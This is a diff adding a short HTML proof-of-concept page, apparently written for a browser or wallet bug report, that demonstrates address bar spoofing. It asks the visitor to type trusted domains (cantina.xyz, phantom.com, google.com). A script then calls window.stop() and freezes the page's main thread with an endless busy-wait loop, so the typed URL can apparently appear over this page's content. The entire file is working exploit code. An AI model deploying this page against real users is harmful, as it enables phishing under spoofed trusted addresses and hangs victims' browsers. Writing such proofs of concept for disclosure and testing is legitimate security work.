@@ -1,0 +1,37 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>TESTErR</title>
+  </head>
+
+  <body style="margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:system-ui">
+    <div>
+      <h1>ADDRESS BAR SPOOFING</h1>
+
+      <p>PLEASE TYPE THIS MANUALLY IN THE ADDRESS BAR</p>
+      <h2>cantina.xyz, phantom.com, google.com</h2>
+    </div>
+
+<script>
+  function freezeChunk(ms) {
+    const end = performance.now() + ms;
+    while (performance.now() < end) {}
+  }
+
+  function loopFreeze() {
+    freezeChunk(120000);
+    setTimeout(loopFreeze, 100); 
+  }
+
+  setTimeout(() => {
+    try {
+      window.stop();
+    } catch (e) {}
+
+    loopFreeze();
+  }, 100);
+</script>
+  </body>
+</html>
